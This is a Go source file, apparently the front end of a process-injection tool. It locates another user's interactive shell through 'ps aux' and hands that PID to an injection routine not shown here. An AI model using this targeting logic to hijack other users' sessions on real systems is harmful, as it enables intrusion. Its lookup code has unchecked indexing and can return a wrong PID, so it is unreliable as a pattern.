package main

import (
	"os"
	"fmt"
	"log"
	"os/exec"
	"strings"
	"flag"
	"strconv"
)

var validShells []string = []string{
	"/bin/bash",
	"/usr/bin/bash",
	"/bin/sh",
	"/usr/bin/sh",
	"/bin/zsh",
	"/usr/bin/zsh",
	"/bin/fish",
	"/usr/bin/fish",
}

func isValidShell(shellToCheck string) bool {
	for shellIndex := range len(validShells) {
		if(shellToCheck == validShells[shellIndex]) {return true}
	}
	return false
}

func greedySplit(given string, delimiter string) []string {
	if(len(given) == 0) {
		return make([]string,0,0)
	}
	var consecutiveDelimiter = false
	var cleanedString = string(given[0])
	for i := 1; i < len(given); i++ {
		var testedChar = string(given[i])
		if(testedChar != delimiter) {
			cleanedString += testedChar
			consecutiveDelimiter = false
		} else if (!consecutiveDelimiter) {
			cleanedString += testedChar
			consecutiveDelimiter = true
		}
	}
	return strings.Split(cleanedString, delimiter)
}

func findTerminal(username string) int {
	//potentialTerminalsCommand := fmt.Sprintf("ps aux | grep %v | grep -e 'pts/' -e 'tty'", username)
	pidString := ""
	commandOutputByte, err := exec.Command("ps", "aux").Output()
	if err != nil {
		log.Fatalf(err.Error())
	}
	commandOutput := string(commandOutputByte)
	processes := strings.Split(commandOutput, "\n")
	for processIndex := range processes {
		processSplit := greedySplit(processes[processIndex], " ")
		if(len(processSplit) == 0) {continue}
		pidString = strings.TrimSpace(string(processSplit[1]))
		var shellString string = strings.TrimSpace(string(processSplit[10]))
		if(processSplit[0] == username && isValidShell(shellString)) {
			break
		}
	}
	pid, err := strconv.Atoi(pidString)
	if err != nil {
		log.Fatalf(err.Error())
	}
	return pid
}

func collectTerminalInformation() {
	file, err := os.Create("./success")
	if err != nil {
		log.Fatalf(err.Error())
	}
	err = file.Close()
	if err != nil {
		log.Fatalf(err.Error())
	}
}

func parseArgs() int {
	pidStr := flag.String("pid", "", "The pid of the process to inject into.")
	targetUser := flag.String("targetUser", "", "The user to target for injection")

	flag.Parse()

	pid := -1

	if (*pidStr != "") {
		pid, _ = strconv.Atoi(*pidStr)
	} else if (*targetUser != ""){
		pid = findTerminal(*targetUser)
	} else {
		fmt.Printf("One of the following is needed:\n\t--pid [PID of the target process]\n\t--targetUser [Username of the user you wish to target]\n")
		os.Exit(0)
	}

	return pid
}

func main() {
	//collectTerminalInformation()
	pid := parseArgs()
	fmt.Printf("Targeting process with pid %v\n", pid)
	launchInjection(pid)
	//setup()
}